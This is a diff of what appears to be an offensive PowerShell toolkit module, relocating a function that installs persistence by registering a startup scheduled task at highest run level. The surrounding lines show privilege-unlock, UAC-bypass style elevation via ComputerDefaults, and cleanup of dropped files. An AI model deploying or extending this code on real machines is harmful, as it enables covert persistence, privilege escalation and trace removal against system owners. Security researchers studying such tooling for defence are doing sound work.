@@ -201,28 +201,6 @@ del "$env:userprofile\enableprivs.exe" -force
 Export-ModuleMember -Function privileges-unlock
 Set-Alias -Name privileges-unlock -Value privileges-unlock
 
-# musis byt admin !
-# example: persistence-tskschld "C:\Windows\System32\calc.exe" "hopicalc" "JohnDoe" "1234"
-function persistence-tskschld {
-    param(
-		[string]$processName,
-		[string]$processTarget,
-		[string]$processUsername,
-		[string]$processPassword
-    )
-    $Request =  $processName
-    $tname =  $processTarget
-    $user = $processUsername
-    $pass = $processPassword
-
-$action = New-ScheduledTaskAction -Execute "$Request"
-$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$tname" -User "$user" -Password "$pass" -RunLevel Highest
-
-}
-Export-ModuleMember -Function persistence-tskschld
-Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld
-
 function xtmpclean {
 Remove-Item -Path "$env:userprofile\d4m*" -force -ErrorAction SilentlyContinue
 Remove-Item -Path "$env:userprofile\levia*" -force -ErrorAction SilentlyContinue
@@ -248,3 +226,27 @@ ComputerDefaults -PID '$IDPORT' -File '$Request'
 }
 Export-ModuleMember -Function process-elevate
 Set-Alias -Name process-elevate -Value process-elevate
+
+# musis byt admin !
+# example: persistence-tskschld "C:\Windows\System32\calc.exe" "hopicalc" "JohnDoe" "1234"
+function persistence-tskschld {
+    param(
+		[string]$processName,
+		[string]$processTarget,
+		[string]$processUsername,
+		[string]$processPassword
+    )
+    $Request =  $processName
+    $tname =  $processTarget
+    $user = $processUsername
+    $pass = $processPassword
+
+$action = New-ScheduledTaskAction -Execute "$Request"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$tname" -User "$user" -Password "$pass" -RunLevel Highest
+
+}
+Export-ModuleMember -Function persistence-tskschld
+Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld
+
+
